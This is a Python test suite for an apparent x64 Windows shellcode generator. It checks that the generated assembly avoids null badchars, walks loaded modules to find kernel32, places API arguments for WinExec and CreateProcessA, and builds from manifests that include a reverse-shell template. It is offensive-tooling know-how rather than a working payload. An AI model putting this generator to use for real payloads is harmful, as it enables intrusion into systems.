class TestP0_3_DirectRegisterResolution:
    """P0-3: Args resolved directly into target registers, not via RAX."""

    def test_two_arg_direct_resolution(self) -> None:
        w = Workflow(
            name="test_direct",
            blocks=(
                Block("entry", (
                    CallAPI("WinExec", (
                        NameRef("cmd"), Immediate(5),
                    ), result="ret"),
                    Terminate(),
                )),
            ),
            entry="entry",
        )
        m = _make_manifest(
            functions=["WinExec"], variables=["ret"],
            strings=[("cmd", "calc.exe")],
        )
        layout = build_layout_x64(m)
        config = _x64_config(command="calc.exe")
        asm = lower_workflow_x64(w, layout, {0x00}, config)
        lines = asm.splitlines()
        call_idx = next(i for i, l in enumerate(lines) if "call qword ptr" in l)
        pre_call = "\n".join(lines[:call_idx])
        assert "mov  rcx" in pre_call or "lea  rcx" in pre_call or "ecx" in pre_call
        assert "edx" in pre_call or "rdx" in pre_call


class TestP0_4_PostAssemblyBadcharValidation:
    """P0-4: Badchar validation of assembled output (requires keystone)."""

    def test_badchar_check_runs_without_keystone(self) -> None:
        import pathlib
        from emitrion.build_x64 import build_x64
        path = str(pathlib.Path(__file__).parent.parent / "manifests" / "x64" / "run_command_x64.yaml")
        result = build_x64(path, assemble=False)
        assert result.asm


class TestP1_2_BoundedModuleEnumeration:
    """P1-2: Module walk has a bounded iteration count."""

    def test_module_counter_present(self) -> None:
        from emitrion.build_x64 import _emit_framework_stubs_x64
        asm = _emit_framework_stubs_x64({0x00})
        assert "r15d" in asm
        assert "module_not_found" in asm

    def test_module_not_found_halts(self) -> None:
        from emitrion.build_x64 import _emit_framework_stubs_x64
        asm = _emit_framework_stubs_x64({0x00})
        section = asm.split("module_not_found:")[1].split("\n\n")[0]
        assert "int3" in section

    def test_r15_not_clobbered_in_loop_body(self) -> None:
        """R15 must survive the find_kernel32_entry/next_module loop body.

        The loop body is all inline assembly (no CALL instructions that
        could clobber R15 per MS x64 ABI). Verify no instruction in the
        loop writes to R15/R15D/R15W/R15B.
        """
        from emitrion.build_x64 import _emit_framework_stubs_x64
        asm = _emit_framework_stubs_x64({0x00})
        loop_start = asm.split("find_kernel32_entry:")[1]
        loop_body = loop_start.split("find_module:")[0]
        r15_writes = {"r15", "r15d", "r15w", "r15b"}
        for line in loop_body.splitlines():
            stripped = line.strip()
            if stripped.startswith(";") or ":" in stripped:
                continue
            if not stripped:
                continue
            parts = stripped.split()
            if len(parts) < 2:
                continue
            instr = parts[0].lower()
            if instr in ("dec", "mov", "xor", "add", "sub", "lea", "movzx"):
                dst = parts[1].rstrip(",").lower()
                if dst in r15_writes and instr != "dec":
                    pytest.fail(
                        f"R15 clobbered by non-counter instruction: {stripped}"
                    )


class TestP0_3_SemanticRegisterTrace:
    """P0-3: Verify register assignments reach the call site intact."""

    def test_four_distinct_args_reach_call(self) -> None:
        """Trace that 4 distinct args are placed in RCX/RDX/R8/R9 before CALL.

        Each arg produces a distinct setup sequence. Verify no arg register
        is overwritten between its setup and the CALL instruction.
        """
        w = Workflow(
            name="test_trace",
            blocks=(
                Block("entry", (
                    AllocateStruct("si", "STARTUPINFOA"),
                    ZeroStruct("si"),
                    CallAPI("CreateProcessA", (
                        NameRef("cmd"),
                        Immediate(0),
                        Immediate(0),
                        Immediate(0),
                    ), result="ret"),
                    Terminate(),
                )),
            ),
            entry="entry",
        )
        m = _make_manifest(
            functions=["CreateProcessA"], variables=["ret"],
            strings=[("cmd", "cmd.exe")],
        )
        layout = build_layout_x64(m, max_stack_args=0)
        config = _x64_config()
        asm = lower_workflow_x64(w, layout, set(), config)
        lines = asm.splitlines()

        call_idx = next(
            i for i, l in enumerate(lines) if "call qword ptr" in l
        )
        pre_call = lines[:call_idx]

        arg_regs = {"rcx", "rdx", "r8", "r9"}
        last_write: dict[str, int] = {}
        for i, line in enumerate(pre_call):
            stripped = line.strip()
            for reg in arg_regs:
                r32 = {"rcx": "ecx", "rdx": "edx", "r8": "r8d", "r9": "r9d"}[reg]
                if any(
                    stripped.startswith(f"{instr}  {r}")
                    for instr in ("mov", "lea", "xor")
                    for r in (reg, r32)
                ):
                    last_write[reg] = i

        for reg in ("rcx", "rdx", "r8", "r9"):
            if reg not in last_write:
                continue
            write_line = last_write[reg]
            for j in range(write_line + 1, call_idx):
                stripped = lines[j].strip()
                if stripped.startswith(";"):
                    continue
                r32 = {"rcx": "ecx", "rdx": "edx", "r8": "r8d", "r9": "r9d"}[reg]
                for instr in ("mov", "xor", "lea"):
                    for r in (reg, r32):
                        if stripped.startswith(f"{instr}  {r},") or \
                           stripped.startswith(f"{instr}  {r} ,"):
                            pytest.fail(
                                f"{reg} overwritten at line {j} after "
                                f"setup at line {write_line}: {stripped}"
                            )


class TestP1_3_ErrorsAsExceptions:
    """P1-3: Lowering errors raise exceptions, not assembly comments."""

    def test_write_struct_field_unknown_struct_raises(self) -> None:
        w = Workflow(
            name="test_err",
            blocks=(
                Block("entry", (
                    WriteStructField("ghost", "field", Immediate(0)),
                    Terminate(),
                )),
            ),
            entry="entry",
        )
        m = _make_manifest(functions=["WinExec"], variables=["ret"])
        layout = build_layout_x64(m)
        with pytest.raises(ValueError, match="has no AllocateStruct"):
            lower_workflow_x64(w, layout, set(), _x64_config())

    def test_zero_struct_unknown_raises(self) -> None:
        w = Workflow(
            name="test_err",
            blocks=(
                Block("entry", (
                    ZeroStruct("ghost"),
                    Terminate(),
                )),
            ),
            entry="entry",
        )
        m = _make_manifest(functions=["WinExec"], variables=["ret"])
        layout = build_layout_x64(m)
        with pytest.raises(ValueError, match="has no AllocateStruct"):
            lower_workflow_x64(w, layout, set(), _x64_config())


class TestP1_4_NoDuplicateStructInit:
    """P1-4: Workflow templates skip compose-level struct init."""

    def test_workflow_skips_compose_struct_init(self) -> None:
        import pathlib
        from emitrion.build_x64 import build_x64
        path = str(pathlib.Path(__file__).parent.parent / "manifests" / "x64" / "revshell_x64.yaml")
        result = build_x64(path, assemble=False)
        assert "handled by workflow IR" in result.asm


class TestP1_5_SignedImmediateHandling:
    """P1-5: Immediate(-1) must produce 64-bit 0xFFFFFFFFFFFFFFFF."""

    def test_negative_one_uses_qword(self) -> None:
        from emitrion.workflow.x64_backend import _LoweringContextX64
        from emitrion.workflow.ir import Immediate

        m = _make_manifest(functions=["WinExec"])
        layout = build_layout_x64(m)
        ctx = _LoweringContextX64(layout, {0x00}, None)
        lines, reg = ctx._resolve_value(Immediate(-1), "rax")
        asm = "\n".join(lines)
        assert "0x" in asm
        val_strs = re.findall(r"0x([0-9a-f]+)", asm)
        combined = "".join(val_strs)
        assert "ffffffffffffffff" in combined or len(combined) > 8

    def test_positive_fits_32bit(self) -> None:
        from emitrion.workflow.x64_backend import _LoweringContextX64
        from emitrion.workflow.ir import Immediate

        m = _make_manifest(functions=["WinExec"])
        layout = build_layout_x64(m)
        ctx = _LoweringContextX64(layout, set(), None)
        lines, reg = ctx._resolve_value(Immediate(0x100), "rax")
        asm = "\n".join(lines)
        assert "eax" in asm
